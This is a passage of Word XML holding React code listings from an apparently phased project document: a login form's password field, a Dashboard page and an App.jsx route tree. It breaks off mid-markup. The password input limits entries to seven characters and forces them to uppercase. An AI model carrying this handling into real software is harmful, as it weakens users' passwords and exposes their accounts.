            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;FormField label="Password" error={errors.password?.message}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;Input type="password" autoComplete="current-password" maxLength={7}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           {...register('password', {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             onChange: e =&gt; { e.target.value = (e.target.value||'').toUpperCase(); }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           })} /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;/FormField&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  {serverError ? &lt;div role="alert" className="rounded-md bg-danger/10 text-danger text-xs px-3 py-2"&gt;{serverError}&lt;/div&gt; : null}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;Button type="submit" variant="primary" className="w-full" disabled={isSubmitting}&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    {isSubmitting</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      ? &lt;&gt;&lt;Spinner size={14} className="text-white"/&gt;Signing in…&lt;/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      : &lt;&gt;&lt;ArrowRight size={16} strokeWidth={1.75}/&gt;Sign In&lt;/&gt;}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;/Button&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.7  Dashboard.jsx — Post-Login Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Stat-card row + collapsible permission inspector. Phase 4 shell only — Phase 8 replaces this with real widgets.</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src/pages/Dashboard.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>export function Dashboard() {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const { user } = useAuth();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const [showPerms, setShowPerms] = useState(false);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!user) return null;</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return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;Layout&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="max-w-3xl"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;h2 className="text-2xl font-semibold text-ink"&gt;Welcome, {user.sub}&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;p className="mt-1 text-sm text-ink-soft"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          You are signed in as &lt;Badge color="badge"&gt;{user.role}&lt;/Badge&gt;.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;div className="mt-8 grid grid-cols-1 sm:grid-cols-3 gap-4"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;StatCard label="Permissions" value={user.permissions.length} hint="granted by role" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;StatCard label="Role"        value={user.role}                hint="single role per user" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;StatCard label="User ID"     value={user.uid}                 hint="users.user_id in DB" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;div className="mt-8 bg-white rounded-lg border border-border shadow-card"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;button onClick={() =&gt; setShowPerms(v =&gt; !v)}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                  className="w-full flex items-center justify-between px-4 py-3 text-sm font-medium text-ink hover:bg-base-elev rounded-lg"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;span&gt;View granted permissions ({user.permissions.length})&lt;/span&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            {showPerms ? &lt;ChevronDown size={16}/&gt; : &lt;ChevronRight size={16}/&gt;}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;/button&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          {showPerms ? (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;div className="px-4 pb-4 pt-1 border-t border-border"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              &lt;ul className="grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-1 text-xs font-mono text-ink-soft py-2"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                {[...user.permissions].sort().map(p =&gt; &lt;li key={p}&gt;{p}&lt;/li&gt;)}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              &lt;/ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;/div&gt;) : null}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/Layout&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.8  App.jsx — Final Route Tree</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src/App.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { AuthProvider } from './lib/auth-context.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { ProtectedRoute } from './components/ProtectedRoute.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Layout } from './components/Layout.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Login } from './pages/Login.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Dashboard } from './pages/Dashboard.jsx';</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export function App() {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;AuthProvider&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;BrowserRouter&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;Routes&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          {/* Public */}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;Route path="/login" element={&lt;Login /&gt;} /&gt;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 Protected (any signed-in user) */}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;Route path="/dashboard" element={</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;ProtectedRoute&gt;&lt;Dashboard /&gt;&lt;/ProtectedRoute&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          } /&gt;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 Protected + permission-gated placeholders (Phase 5+) */}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;Route path="/equipment" element={</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;ProtectedRoute requiredPermission="equipment:read-list"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              &lt;Layout&gt;&lt;ModulePlaceholder title="Equipment" phase={5}/&gt;&lt;/Layout&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;/ProtectedRoute&gt;} /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          {/* …job-requests, job-cards, inquiry, audit, admin/users follow the same shape */}</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xml:space="preserve">          {/* Catch-all */}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;Route path="*" element={&lt;Navigate to="/dashboard" replace /&gt;} /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;/Routes&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
